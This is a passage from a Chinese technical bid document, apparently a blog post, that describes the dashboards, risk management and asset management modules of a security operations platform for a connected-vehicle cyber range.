持向相关用户发送电子邮件通知。</p><p>平台审计功能：</p><p>平台应记录用户的所有关键操作日志，包括登录、计划制定、任务创建、任务执行、漏洞信息编写、回归测试等。</p><p>日志记录应支持多维度筛选，例如按时间、任务、车型、测试人等，以便于生成详细的审计记录。</p><h2 id="平台支持"><a href="#平台支持" class="headerlink" title="平台支持"></a>平台支持</h2><p>功能参数如下：</p><ol><li>通过B/S架构开发，方便客户端通过浏览器访问服务器，管理平台评审时，提供完整方案并提供具备基本跳转及展示功能的可视化模型；</li><li>第2部分测试管理模块，在开发前我司将会与客户确认，开发过程中根据客户具体需求调整，如有细化优化以客户要求为准。</li><li>在终验收后五年内免费升级，若后续测试管理模块出现问题也支持免费维护升级；</li><li>操作系统支持Linux/Win10或者Windows的更高版本。</li></ol><p>响应方案：</p><p>B/S架构开发：</p><p>平台将基于浏览器/服务器（B/S）架构进行开发，确保用户可以通过任何标准的网络浏览器访问系统。</p><p>在管理平台的评审阶段，将提供一个完整的技术方案，并展示一个具备基本跳转及展示功能的可视化原型模型。</p><p>这个原型模型将帮助评审团队理解平台的核心功能和用户界面的布局。</p><p>测试管理模块开发协调：</p><p>在开发测试管理模块之前，贵司将与客户进行确认，以确保开发工作符合客户的具体需求。</p><p>开发过程中，将根据客户提出的具体需求进行调整，优先考虑任何细化和优化的指示。</p><p>免费升级与维护承诺：</p><p>在最终验收后的五年内，将提供免费的升级服务，以确保平台能够适应未来的技术发展和用户需求变化。</p><p>若测试管理模块在后续使用过程中出现任何问题，也将提供免费的维护和升级支持。</p><p>操作系统兼容性：</p><p>平台将支持多种操作系统，包括Linux、Windows 10以及Windows的更高版本。</p><p>这样可以确保用户在不同的操作系统环境下都能够稳定运行平台。</p><h1 id="智能汽车网络靶场安全运营平台"><a href="#智能汽车网络靶场安全运营平台" class="headerlink" title="智能汽车网络靶场安全运营平台"></a>智能汽车网络靶场安全运营平台</h1><h2 id="总体概述-3"><a href="#总体概述-3" class="headerlink" title="总体概述"></a>总体概述</h2><p>汽车安全运营平台与靶场、漏洞管理平台、安全检测平台对接，对其他平台告警和日志信息的归并整合，结合威胁分析模型、安全检测规则，实现对全网XXXX车联网相关安全事件的检测及处置，会同其他平台和运营机制实现事件和漏洞闭环，结合安全大数据、威胁情报实现资产风险的提前感知和预警。</p><p>（1）应急管理</p><p>全方位掌握车联网平台系统、车联网络安全状况，及时通报预警网络安全隐患，高效处置汽车网络安全案事件。当发现威胁攻击时，通过该系统可查看攻击状态，可调度安全服务单位、技术支撑厂商、专家组等进行研判会审和应急处置，并形成专案专报，打造高效“一站式”指挥调度作战平台。</p><p>（2）建立监测、预警、通报、处置、反馈为一体的闭环管理体系</p><p>通过采集分析车联网总体安全状况，对各类网络安全威胁态势进行分析和展示。通过把整车网络、车联网络、TSP网站内所检测到的攻击事件，把SRC平台、靶场平台以及安全检测平台发现的漏洞进行通报，反馈安全整改情况，形成统一的安全事件管理体系。</p><h2 id="总体技术要求"><a href="#总体技术要求" class="headerlink" title="总体技术要求"></a>总体技术要求</h2><h3 id="平台技术要求"><a href="#平台技术要求" class="headerlink" title="平台技术要求"></a>平台技术要求</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/db43e52d3335a5afb41e6b113d96299b.png"></p><p>汽车运营中心：作为核心部分，负责整体安全管理和协调工作。它监测车联网平台系统和车联网络的安全状况，并及时通报预警网络安全隐患。在发现威胁攻击时，可以查看攻击状态，并调度安全服务单位、技术支撑厂商、专家组等进行研判会审和应急处置。</p><p>靶场和漏洞管理平台：与汽车运营中心对接，提供靶场环境和漏洞管理功能。靶场平台用于模拟攻击和漏洞测试，漏洞管理平台用于收集和管理发现的漏洞信息。它们将发现的攻击事件和漏洞信息通过接口通报给汽车运营中心。</p><p>安全检测平台：与汽车运营中心对接，用于检测全网车联网的安全事件。它结合威胁分析模型和安全检测规则，对车联网进行实时监测，并将检测到的安全事件通过接口通报给汽车运营中心。</p><p>其他平台：除了靶场、漏洞管理平台和安全检测平台外，还可能存在其他安全相关平台。这些平台的告警和日志信息将被归并整合，并通过接口与汽车运营中心进行交互。</p><p>功能参数如下：</p><ul><li>汽车安全运营平台功能包含系统管理、资产及风险管理、威胁分析、态势展示等功能。</li><li>支持接入汽车业务平台数据，进行数据统一管理及分析</li><li>安全运营平台至少包含五大业务主题库：漏洞库、资产库、事件库、应急库等知识库。</li><li>平台运营内容包含“通报预警”、“应急处置”、“实时监测”、“资产管理”、“运营工作台”等业务功能模块</li><li>支持攻击者数据分析，将靶场攻击者行为和关键信息与现有资产结合分析，形成资产风险预警</li><li>支持多维度的安全态势展示，不限于整体综合态势、车型态势、漏洞态势、零部件态势等，有助于安全运营和安全运维人员分析处理。</li><li>支持对其他平台数据进行汇总、梳理、统计和分析等，形成统一关联分析的报告。</li></ul><h3 id="安全运营体系建设"><a href="#安全运营体系建设" class="headerlink" title="安全运营体系建设"></a>安全运营体系建设</h3><p>围绕汽车安全运营平台，开展安全运营工作，通过各类专业技术人员的岗位协同工作，对网络安全态势感知所产生的各类汽车安全数据，例如汽车安全事件数据、漏洞数据、威胁情报和安全风险趋势等，通过专业的技术工作，充分和实际环境相结合，输出相关数据监测和分析报告，同时协同外部开展相应的响应和处置工作，更全面、更准确、更高效地行使信息安全监管职能。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/58c52925c372b00ef1ee44d021749028.png"></p><p>通过威胁预测、持续检测发现的问题可以辅助提高威胁防护能力，威胁预测及持续检测形成的数据可以支撑响应处置，从而实现安全运行的闭环管理。</p><h3 id="功能架构"><a href="#功能架构" class="headerlink" title="功能架构"></a>功能架构</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/19ccb3de16ccc4440f4fa0bb384113fb.png"></p><h4 id="态势展示"><a href="#态势展示" class="headerlink" title="态势展示"></a>态势展示</h4><h5 id="整体态势"><a href="#整体态势" class="headerlink" title="整体态势"></a>整体态势</h5><p>整体综合态势展示：以图表、报表等形式展示车联网安全态势的整体情况。多种展示模式：提供多种展示模式，包括图标、柱状图、折线图等，以满足不同的展示需求。</p><p>功能参数如下：</p><ul><li>综合风险值、资产数量、威胁数量、脆弱性数量和日志接入量五个维度展示综合安全情况，风险值的自定义计算范围包括威胁告警及脆弱性的危害等级、时间范围、处置状态等纬度；</li><li>支持以地图呈现各省的汽车网络安全事件分布态势，且支持对攻击源与攻击对象关联显示，应对不同级别的威胁事件进行不同颜色的标识并能进行动态展示</li><li>通过对于软硬件资产的梳理、对于资产的安全状态进行监控，进行安全事件的统计和分析；</li><li>对每日推送的漏洞数量进行统计分析，便于管理人员能够实时、直观掌握不同类型漏洞的分布区域、数量及变化趋势等态势情况；</li><li>支持最新事件的告警显示，包括车辆识别码、攻击来源、攻击事件、攻击等级等；态势显示支持可配置显示属性，包括：车型筛选、刷新方式设置</li><li>支持显示按天统计的安全事件折线图趋势；</li><li>支持按事件类型统计的安全事件柱状图分布态势；</li><li>整体技术及展示效果及内容通过甲方审核并通过验证。</li></ul><h6 id="综合安全情况展示模块："><a href="#综合安全情况展示模块：" class="headerlink" title="综合安全情况展示模块："></a>综合安全情况展示模块：</h6><p>综合安全情况展示：通过综合风险值、资产数量、威胁数量、脆弱性数量和日志接入量等五个维度展示综合安全情况。风险值的计算范围可以根据威胁告警及脆弱性的危害等级、时间范围、处置状态等维度进行自定义计算。</p><h6 id="地图展示模块："><a href="#地图展示模块：" class="headerlink" title="地图展示模块："></a>地图展示模块：</h6><p>汽车网络安全事件分布态势：以地图形式展示各省的汽车网络安全事件分布态势。同时，对攻击源与攻击对象的关联显示，并能根据不同级别的威胁事件进行不同颜色的标识，实现动态展示。</p><h6 id="资产监控与分析模块："><a href="#资产监控与分析模块：" class="headerlink" title="资产监控与分析模块："></a>资产监控与分析模块：</h6><p>软硬件资产梳理与监控：对软硬件资产进行梳理和监控，实时掌握资产的安全状态。</p><p>安全事件统计与分析：对安全事件进行统计和分析，包括每日推送的漏洞数量统计分析，以便管理人员能够实时、直观地了解不同类型漏洞的分布区域、数量和变化趋势等态势情况。</p><h6 id="漏洞统计分析模块："><a href="#漏洞统计分析模块：" class="headerlink" title="漏洞统计分析模块："></a>漏洞统计分析模块：</h6><p>漏洞统计分析模块是一种用于对每日推送的漏洞数量进行统计分析的工具。它能够帮助管理人员实时、直观地了解不同类型漏洞的分布区域、数量和变化趋势。该模块通过收集和整理漏洞信息，并进行数据分析和可视化展示，提供直观的统计报告和图表。管理人员可以通过这些报告和图表，快速了解漏洞的分布情况，发现高风险区域和漏洞密集区域，及时采取相应的安全措施和修复措施，以保障系统和网络的安全。这样，管理人员能够更好地掌握漏洞态势，及时做出决策，提高安全响应效率。</p><h6 id="最新时间告警显示模块："><a href="#最新时间告警显示模块：" class="headerlink" title="最新时间告警显示模块："></a>最新时间告警显示模块：</h6><p>最新事件告警显示：展示最新的安全事件，包括车辆识别码、攻击来源、攻击事件、攻击等级等信息。同时，态势显示可配置显示属性，如车型筛选和刷新方式设置。</p><h6 id="安全事件趋势展示模块："><a href="#安全事件趋势展示模块：" class="headerlink" title="安全事件趋势展示模块："></a>安全事件趋势展示模块：</h6><p>安全事件折线图趋势：按天统计的安全事件折线图展示，以展示安全事件的趋势变化。</p><p>安全事件柱状图分布态势：按事件类型统计的安全事件柱状图展示，以展示安全事件的分布态势。</p><h6 id="展示效果审核验证"><a href="#展示效果审核验证" class="headerlink" title="展示效果审核验证"></a>展示效果审核验证</h6><p>我方交付提供的整体技术及展示效果需按照甲方符合甲方需求，并通过甲方的审核验证</p><h5 id="车型态势"><a href="#车型态势" class="headerlink" title="车型态势"></a>车型态势</h5><p>车型态势展示：展示不同车型的安全态势和相关事件。多种展示模式：提供多种展示模式，包括图标、柱状图、折线图等，以满足不同的展示需求。可以按客户需求进行定制。</p><p>功能参数如下：</p><ul><li>支持以车型视角查看对应车型的零部件安全态势，可展示每个车辆的风险状态，并以动态效果显示，能够滚动展示告警信息</li><li>监控平台所有车型安全态势，支持查看具体车型安全态势；</li><li>监控车型所面临的主要风险，以及相关的事件总数；</li><li>支持监控车型风险等级,车型风险趋势，趋势应用较美观的图表形式展示；</li><li>支持监控并预警风险车辆；</li><li>支持监控并统计具体车型下的以下安全态势：<ul><li>支持车型整体事件趋势、风险等级分布；</li><li>支持展示面临的TOP风险类型、风险事件；</li><li>支持展示TOP风险车辆、风险零部件；</li><li>支持展示风险零部件事件趋势</li><li>支持提供多种展示模式包括图标、柱状图、折线图等展示内容</li></ul></li><li>整体技术及展示效果及内容通过甲方审核并通过验证。</li></ul><h6 id="车型安全态势展示模块："><a href="#车型安全态势展示模块：" class="headerlink" title="车型安全态势展示模块："></a>车型安全态势展示模块：</h6><p>车型零部件安全态势：以车型视角查看对应车型的零部件安全态势，展示每个车辆的风险状态，并以动态效果滚动展示告警信息。</p><p>车型安全监控模块：</p><p>所有车型安全态势监控：监控平台所有车型的安全态势，查看具体车型的安全态势。</p><p>主要风险监控：监控车型所面临的主要风险，并显示相关的事件总数。</p><p>车型风险等级监控：监控车型的风险等级，并以美观的图表形式展示车型风险趋势。</p><h6 id="风险车辆监控与预警模块："><a href="#风险车辆监控与预警模块：" class="headerlink" title="风险车辆监控与预警模块："></a>风险车辆监控与预警模块：</h6><p>风险车辆监控：监控并预警风险车辆，及时发现并处理潜在的风险。</p><p>车型安全态势监控：监控并统计具体车型下的安全态势，包括车型整体事件趋势、风险等级分布等。</p><h6 id="车型风险分析与展示模块："><a href="#车型风险分析与展示模块：" class="headerlink" title="车型风险分析与展示模块："></a>车型风险分析与展示模块：</h6><p>TOP风险类型与风险事件展示：展示车型面临的TOP风险类型和相关风险事件。</p><p>TOP风险车辆与风险零部件展示：展示车型中的TOP风险车辆和风险零部件。</p><p>风险零部件事件趋势展示：展示风险零部件的事件趋势。</p><h6 id="展示效果审核验证-1"><a href="#展示效果审核验证-1" class="headerlink" title="展示效果审核验证"></a>展示效果审核验证</h6><p>我方交付提供的整体技术及展示效果需按照甲方符合甲方需求，并通过甲方的审核验证</p><h5 id="漏洞态势"><a href="#漏洞态势" class="headerlink" title="漏洞态势"></a>漏洞态势</h5><p>漏洞态势展示：展示车联网平台中的漏洞情况和相关统计数据。多种展示模式：提供多种展示模式，包括图标、柱状图、折线图等，以满足不同的展示需求。</p><p>功能参数如下：</p><ul><li>提供漏洞类型分布车型展示；</li><li>支持统计漏洞等级比例，如高危漏洞占比等；</li><li>支持统计漏洞零部件的占比，针对每个车型；</li><li>支持最新挖掘的漏洞展示；</li><li>支持统计发生漏洞影响资产TOP5的统计；</li><li>支持态势展示内容提供多种展示模式包括图标、柱状图、折线图等展示内容；</li><li>支持对接漏洞管理平台数据，进行漏洞监测展示，形式包括不限于图表、3D态势展示等；</li><li>整体技术及展示效果及内容通过甲方审核并通过验证。</li></ul><h6 id="漏洞类型分布车型展示模块"><a href="#漏洞类型分布车型展示模块" class="headerlink" title="漏洞类型分布车型展示模块"></a>漏洞类型分布车型展示模块</h6><p>漏洞类型分布展示：提供漏洞类型分布车型展示，以图表形式展示不同车型中各种漏洞类型的分布情况。</p><h6 id="漏洞等级统计与展示模块"><a href="#漏洞等级统计与展示模块" class="headerlink" title="漏洞等级统计与展示模块"></a>漏洞等级统计与展示模块</h6><p>漏洞等级比例统计：统计漏洞等级比例，如高危漏洞占比等，以图表形式展示不同车型中各个漏洞等级的比例情况。</p><h6 id="漏洞零部件占比统计模块"><a href="#漏洞零部件占比统计模块" class="headerlink" title="漏洞零部件占比统计模块"></a>漏洞零部件占比统计模块</h6><p>漏洞零部件占比统计：统计漏洞零部件的占比，针对每个车型，以图表形式展示不同车型中各个漏洞零部件的占比情况。</p><h6 id="最新漏洞展示模块"><a href="#最新漏洞展示模块" class="headerlink" title="最新漏洞展示模块"></a>最新漏洞展示模块</h6><p>最新漏洞展示：展示最新挖掘的漏洞信息，包括漏洞描述、影响车型、修复建议等。</p><h6 id="漏洞影响资产统计模块"><a href="#漏洞影响资产统计模块" class="headerlink" title="漏洞影响资产统计模块"></a>漏洞影响资产统计模块</h6><p>漏洞影响资产统计：统计发生漏洞影响的资产TOP5，并以图表形式展示。支持对接漏洞管理平台数据，进行漏洞监测展示，形式包括不限于图表、3D态势展示等。</p><h6 id="展示效果审核验证-2"><a href="#展示效果审核验证-2" class="headerlink" title="展示效果审核验证"></a>展示效果审核验证</h6><p>我方交付提供的整体技术及展示效果需按照甲方符合甲方需求，并通过甲方的审核验证</p><h5 id="零部件态势"><a href="#零部件态势" class="headerlink" title="零部件态势"></a>零部件态势</h5><p>零部件态势展示：展示车联网平台中各个零部件的安全态势和相关事件。多种展示模式：提供多种展示模式，包括图标、柱状图、折线图等，以满足不同的展示需求。</p><ul><li>支持监控零部件风险分布态势展示，零部件在车辆所在位置进行图表展示，并以柱状图、折线图等展示风险信息及风险占比情况；</li><li>支持统计针对零部件事件等级分布，并以柱状图、饼状图、折线图等展示风险统计信息；</li><li>支持统计零部件供应商风险排行，用美观的图表展示排名信息；</li><li>支持统计TOP5风险零部件对应的车辆；</li><li>支持零部件安全风险走势分析；</li><li>整体技术及展示效果及内容应通过甲方审核并通过验证。</li></ul><h6 id="零部件风险分布态势展示模块："><a href="#零部件风险分布态势展示模块：" class="headerlink" title="零部件风险分布态势展示模块："></a>零部件风险分布态势展示模块：</h6><p>零部件风险分布展示：监控零部件风险分布态势展示，将零部件在车辆所在位置以图表形式展示，并提供柱状图、折线图等方式展示风险信息及风险占比情况。</p><h6 id="零部件事件等级分布统计与展示模块："><a href="#零部件事件等级分布统计与展示模块：" class="headerlink" title="零部件事件等级分布统计与展示模块："></a>零部件事件等级分布统计与展示模块：</h6><p>零部件事件等级分布统计：统计针对零部件事件的等级分布，并以柱状图、饼状图、折线图等形式展示风险统计信息。</p><h6 id="零部件供应商风险排行展示模块："><a href="#零部件供应商风险排行展示模块：" class="headerlink" title="零部件供应商风险排行展示模块："></a>零部件供应商风险排行展示模块：</h6><p>零部件供应商风险排行统计：统计零部件供应商的风险排行，并以美观的图表形式展示排名信息。</p><h6 id="TOP5风险零部件对应车辆统计模块："><a href="#TOP5风险零部件对应车辆统计模块：" class="headerlink" title="TOP5风险零部件对应车辆统计模块："></a>TOP5风险零部件对应车辆统计模块：</h6><p>TOP5风险零部件对应车辆统计：统计TOP5风险零部件对应的车辆，并以图表形式展示。</p><h6 id="零部件安全风险走势分析模块："><a href="#零部件安全风险走势分析模块：" class="headerlink" title="零部件安全风险走势分析模块："></a>零部件安全风险走势分析模块：</h6><p>零部件安全风险走势分析：对零部件安全风险进行走势分析，展示零部件的安全风险随时间的变化情况。</p><h6 id="展示效果审核验证-3"><a href="#展示效果审核验证-3" class="headerlink" title="展示效果审核验证"></a>展示效果审核验证</h6><p>我方交付提供的整体技术及展示效果需按照甲方符合甲方需求，并通过甲方的审核验证</p><h5 id="威胁预警态势"><a href="#威胁预警态势" class="headerlink" title="威胁预警态势"></a>威胁预警态势</h5><p>威胁预警态势：展示安全运营平台接入的各个维度的威胁预警信息。</p><p>功能参数如下：</p><ul><li>支持通过弦图展示预警事件中攻击者、受害者、既是攻击者也是受害者的IP之间关系；</li><li>支持展示当前威胁预警事件对资产造成的影响趋势，包括风险资产、受攻击资产、失陷资产的影响趋势；</li><li>支持对预警事件中的关键里程碑节点进行记录、展示；支持展示预警事件中攻击者、受害者的TOP5统计。</li><li>支持展示预警事件中最新的安全事件</li><li>整体技术及展示效果及内容通过甲方审核并通过验证。</li></ul><h6 id="弦图展示模块："><a href="#弦图展示模块：" class="headerlink" title="弦图展示模块："></a>弦图展示模块：</h6><p>IP之间关系展示：通过弦图展示预警事件中攻击者、受害者、既是攻击者又是受害者的IP之间的关系。弦图可以清晰地呈现不同IP之间的连接和关联。</p><h6 id="影响趋势展示模块："><a href="#影响趋势展示模块：" class="headerlink" title="影响趋势展示模块："></a>影响趋势展示模块：</h6><p>威胁事件影响趋势：展示当前威胁预警事件对资产造成的影响趋势，包括风险资产、受攻击资产和失陷资产的影响趋势。以图表形式展示，让用户能够直观地了解事件对资产的影响程度和趋势。</p><h6 id="关键里程碑节点展示模块："><a href="#关键里程碑节点展示模块：" class="headerlink" title="关键里程碑节点展示模块："></a>关键里程碑节点展示模块：</h6><p>里程碑节点记录与展示：对预警事件中的关键里程碑节点进行记录，并在展示中突出显示。用户可以清楚地了解事件的重要阶段和关键节点。</p><p>TOP5统计展示：展示预警事件中攻击者和受害者的TOP5统计，以图表形式展示，让用户能够快速了解最活跃的攻击者和受害者。</p><h6 id="最新安全事件展示模块："><a href="#最新安全事件展示模块：" class="headerlink" title="最新安全事件展示模块："></a>最新安全事件展示模块：</h6><p>最新安全事件展示：展示预警事件中最新的安全事件，以便用户及时了解最新的安全威胁。</p><h6 id="展示效果审核验证-4"><a href="#展示效果审核验证-4" class="headerlink" title="展示效果审核验证"></a>展示效果审核验证</h6><p>我方交付提供的整体技术及展示效果需按照甲方符合甲方需求，并通过甲方的审核验证</p><h5 id="外部威胁态势"><a href="#外部威胁态势" class="headerlink" title="外部威胁态势"></a>外部威胁态势</h5><p>外部威胁态势：展示来自外部的威胁信息。</p><p>功能参数如下：</p><ul><li>支持通过3D地图/2D世界地图/2D中国地图展示外部威胁攻击，可以统计外部威胁总数、受攻击IP总数和受攻击资产总数，TOP5的受攻击资产，威胁来源国家/地区的分布情况，TOP5的攻击源IP。地图效果对应威胁展示应用明确的动态效果，从3D地图中应能明确看到中国地图板块，并且界面展示效果应具备科技感</li><li>支持按威胁级别统计威胁分布情况，按威胁类型统计威胁分布情况，统计最近30天的威胁分布情况</li><li>支持对内部IP自定义区域位置，并在地图展现该区域</li><li>整体技术及展示效果及内容应通过甲方审核并通过验证。</li></ul><h6 id="外部威胁攻击展示模块："><a href="#外部威胁攻击展示模块：" class="headerlink" title="外部威胁攻击展示模块："></a>外部威胁攻击展示模块：</h6><p>地图展示：通过3D地图、2D世界地图或2D中国地图展示外部威胁攻击，以展示威胁的地理分布情况。</p><p>统计信息：提供外部威胁总数、受攻击IP总数和受攻击资产总数的统计信息。</p><p>TOP5受攻击资产：展示受攻击次数最多的TOP5资产，并标注在地图上。</p><p>威胁来源国家/地区分布：展示威胁来源国家/地区的分布情况，并以图表形式展示。</p><p>TOP5攻击源IP：展示攻击次数最多的TOP5攻击源IP，并标注在地图上。</p><p>动态效果：地图效果应具备科技感，能够呈现明确的动态效果，使威胁展示应用更加生动。</p><h6 id="威胁分布统计模块："><a href="#威胁分布统计模块：" class="headerlink" title="威胁分布统计模块："></a>威胁分布统计模块：</h6><p>按威胁级别统计：按威胁级别统计威胁的分布情况，并以图表形式展示。</p><p>按威胁类型统计：按威胁类型统计威胁的分布情况，并以图表形式展示。</p><p>最近30天威胁分布：统计最近30天的威胁分布情况，并以图表形式展示。</p><h6 id="内部IP自定义区域展示模块："><a href="#内部IP自定义区域展示模块：" class="headerlink" title="内部IP自定义区域展示模块："></a>内部IP自定义区域展示模块：</h6><p>自定义区域位置展示：在地图上展示内部IP自定义区域的位置，以便用户能够直观地了解内部IP的分布情况。</p><h6 id="展示效果审核验证-5"><a href="#展示效果审核验证-5" class="headerlink" title="展示效果审核验证"></a>展示效果审核验证</h6><p>我方交付提供的整体技术及展示效果需按照甲方符合甲方需求，并通过甲方的审核验证</p><h5 id="攻击者态势"><a href="#攻击者态势" class="headerlink" title="攻击者态势"></a>攻击者态势</h5><p>攻击者态势：通过对告警信息、威胁信息的分析、匹配，实时展示攻击者信息。</p><p>功能参数如下：</p><ul><li>支持在3D地图/2D中国地图上展示攻击者来源的分布情况，攻击者来源展示应以动态效果在地球模型上进行展示，地图信息应能够看出位置信息</li><li>支持展示攻击者IP的相关归属地、攻击手段、攻击链阶段、告警次数、受害者IP数、危害等级的明细列表。</li><li>支持统计攻击者IP总数，支持统计危急攻击者IP的占比。支持展示今日新增攻击者IP数及今日环比情况; 支持统计攻击总数，支持统计攻击结果为成功的攻击占比。支持展示今日新增攻击数量及今日环比情况; 支持统计受害者IP总数，支持已失陷的受害者IP的占比。支持展示今日新增受害者IP数及今日环比情</li><li>整体技术及展示效果及内容应通过甲方审核并通过验证。</li></ul><h6 id="攻击者分布展示模块："><a href="#攻击者分布展示模块：" class="headerlink" title="攻击者分布展示模块："></a>攻击者分布展示模块：</h6><p>地图展示：在3D地图或2D中国地图上展示攻击者来源的分布情况，并以动态效果在地球模型上展示。地图信息应能够清晰地显示攻击者的位置信息。</p><h6 id="攻击者IP明细列表展示模块："><a href="#攻击者IP明细列表展示模块：" class="headerlink" title="攻击者IP明细列表展示模块："></a>攻击者IP明细列表展示模块：</h6><p>相关归属地展示：展示攻击者IP的相关归属地信息，以便用户了解攻击者的地理位置。</p><p>攻击手段展示：展示攻击者IP使用的攻击手段，让用户了解攻击的方式和技术。</p><p>攻击链阶段展示：展示攻击者IP在攻击链中所处的阶段，以帮助用户了解攻击的过程。</p><p>告警次数展示：展示攻击者IP的告警次数，以评估攻击者的活跃程度。</p><p>受害者IP数展示：展示攻击者IP影响的受害者IP数量，以了解攻击的规模和影响范围。</p><p>危害等级展示：展示攻击者IP的危害等级，以评估攻击的威胁程度。</p><h6 id="统计信息展示模块："><a href="#统计信息展示模块：" class="headerlink" title="统计信息展示模块："></a>统计信息展示模块：</h6><p>攻击者IP总数统计：统计攻击者IP的总数，并以图表形式展示。</p><p>危急攻击者IP占比统计：统计危急攻击者IP在总攻击者IP中的占比，并以图表形式展示。</p><p>今日新增攻击者IP数及环比情况展示：展示今日新增攻击者IP的数量，并与前一日进行环比比较。</p><p>攻击总数统计：统计攻击的总数，并以图表形式展示。</p><p>成功攻击占比统计：统计攻击结果为成功的攻击在总攻击数中的占比，并以图表形式展示。</p><p>今日新增攻击数量及环比情况展示：展示今日新增攻击的数量，并与前一日进行环比比较。</p><p>受害者IP总数统计：统计受害者IP的总数，并以图表形式展示。</p><p>已失陷受害者IP占比统计：统计已失陷的受害者IP在总受害者IP中的占比，并以图表形式展示。</p><p>今日新增受害者IP数及环比情况展示：展示今日新增受害者IP的数量，并与前一日进行环比比较。</p><h6 id="展示效果审核验证-6"><a href="#展示效果审核验证-6" class="headerlink" title="展示效果审核验证"></a>展示效果审核验证</h6><p>我方交付提供的整体技术及展示效果需按照甲方符合甲方需求，并通过甲方的审核验证</p><h4 id="资产风险管理"><a href="#资产风险管理" class="headerlink" title="资产风险管理"></a>资产风险管理</h4><h5 id="风险管理"><a href="#风险管理" class="headerlink" title="风险管理"></a>风险管理</h5><p>风险管理：对车联网平台的风险进行评估和分析，识别潜在的威胁和漏洞。</p><p>功能参数如下：</p><ul><li>风险场景定义，包括风险零部件、风险车辆、风险车型等，可对具体规则进行编辑；平台提供风险零部件、风险车辆、风险车型各五个风险场景，如攻击利用、恶意软件、拒绝服务、异常事件、内容安全、信息收集、威胁活动、情报命中等场景；</li><li>风险事件及等级定义，支持对具体规则、等级进行编辑；同时支持包括新增及删除；</li><li>支持风险统计功能，包括风险等级维度、车型维度、零部件维度、事件维度、地点维度等；</li><li>可定制仪表板功能（Dashboard），能够在仪表板内加入多种统计分析视图（含自定义），支持在引用视图时查看视图内容，还支持跳转到视图模块新增视图便于仪表板快速引用。支持选择、拖拽、边框调整等操作；</li><li>风险告警管理,可灵活调配上报周期，告警次数，风险等级；</li><li>支持报表统计，提供日报、月报、季报、年报，内容包括车辆、事件、工单；</li><li>报表支持导出，导出格式支持PDF、Excel、word，报表模板支持LOGO自定义等操作。</li></ul><h6 id="风险场景定义与编辑模块："><a href="#风险场景定义与编辑模块：" class="headerlink" title="风险场景定义与编辑模块："></a>风险场景定义与编辑模块：</h6><p>风险场景定义：系统支持定义风险场景，包括风险零部件、风险车辆、风险车型等。用户可以根据实际需求编辑具体的规则和场景描述，以满足不同的风险识别和管理需求。</p><p>风险场景数量要求：平台提供等于五个风险场景，如攻击利用、恶意软件、拒绝服务、异常事件、内容安全、信息收集、威胁活动、情报命中等场景，以便用户进行风险分析和管理。</p><h6 id="风险事件及等级定义模块："><a href="#风险事件及等级定义模块：" class="headerlink" title="风险事件及等级定义模块："></a>风险事件及等级定义模块：</h6><p>风险事件定义与编辑：系统支持定义和编辑风险事件，用户可以针对具体规则和等级进行编辑。同时，系统还支持新增和删除风险事件，以便用户根据实际情况进行管理和调整。</p><h6 id="风险统计功能模块："><a href="#风险统计功能模块：" class="headerlink" title="风险统计功能模块："></a>风险统计功能模块：</h6><p>风险统计维度：系统支持风险统计功能，包括不限于风险等级维度、车型维度、零部件维度、事件维度、地点维度等。用户可以根据需要选择统计维度，以获取相应的风险统计数据。</p><h6 id="定制仪表板功能模块："><a href="#定制仪表板功能模块：" class="headerlink" title="定制仪表板功能模块："></a>定制仪表板功能模块：</h6><p>仪表板定制：系统支持定制仪表板，用户可以在仪表板内加入多种统计分析视图，并支持自定义视图。用户可以选择、拖拽、调整边框等操作，以创建符合自己需求的仪表板。同时，用户可以在引用视图时查看视图内容，并支持跳转到视图模块新增视图，方便快速引用。</p><h6 id="风险告警管理模块："><a href="#风险告警管理模块：" class="headerlink" title="风险告警管理模块："></a>风险告警管理模块：</h6><p>告警调配：系统支持灵活调配风险告警的上报周期、告警次数和风险等级。用户可以根据需要进行设置和调整，以满足风险管理和告警需求。</p><h6 id="报表统计模块"><a href="#报表统计模块" class="headerlink" title="报表统计模块"></a>报表统计模块</h6><p>报表统计模块是一种功能强大的工具，支持生成各种报表，包括日报、月报、季报和年报。它能够提供全面的统计信息，涵盖车辆、事件和工单等内容。用户可以根据需要选择报表类型，并指定时间范围进行统计。报表统计模块还提供导出功能，支持将报表导出为PDF、Excel和Word等格式，以便用户方便地保存、打印和共享报表数据。此外，报表模板还支持LOGO自定义，用户可以根据自己的需求添加公司或组织的标识，使报表更具个性化和专业性。通过报表统计模块，用户可以轻松地获取详细的统计信息，并灵活地处理和利用这些数据，以支持决策和业务分析。</p><h5 id="资产管理-1"><a href="#资产管理-1" class="headerlink" title="资产管理"></a>资产管理</h5><p>资产管理：对车联网平台和相关设备进行资产信息的录入、分类和管理。</p><p>功能参数如下：</p><ul><li>支持资产详情信息的展示，能够展现资产名称、IP地址、分组、厂商、型号、操作系统类型、物理地址、责任人等资产基础信息；</li><li>对所有车型、车辆、零部件资产、软件资产、车辆事件的资产匹配与管理；</li><li>支持车联网相关资产字段：包括硬件版本、软件版本、零部件编号、投标方信息、IP、ECUID、嵌入式操作系统版本、关联车型等；</li><li>可手动添加车型、也可通过其他平台对接导入；</li><li>支持不同维度筛选车型、车辆，如日期、供应商、车型年代等；</li><li>支持快捷查看车型态势、车辆态势对应的资产信息；</li><li>支持车辆授权状态展示；</li><li>车辆详情支持查看对应的安全态势，包括事件、车机资源等。</li></ul><h6 id="资产详情展示模块："><a href="#资产详情展示模块：" class="headerlink" title="资产详情展示模块："></a>资产详情展示模块：</h6><p>资产基础信息展示：系统支持展示资产的基础信息，包括资产名称、IP地址、分组、厂商、型号、操作系统类型、物理地址、责任人等。用户可以通过资产详情页面查看和管理资产的基本信息。</p><h6 id="资产匹配与管理模块："><a href="#资产匹配与管理模块：" class="headerlink" title="资产匹配与管理模块："></a>资产匹配与管理模块：</h6><p>车型、车辆、零部件资产管理：系统支持对车型、车辆、零部件资产进行匹配和管理。用户可以将资产与相应的车型、车辆、零部件进行关联，并进行管理和跟踪。</p><p>软件资产管理：系统支持对软件资产进行管理，包括版本控制、更新记录等。用户可以查看和管理软件资产的相关信息。</p><h6 id="车联网相关资产字段模块："><a href="#车联网相关资产字段模块：" class="headerlink" 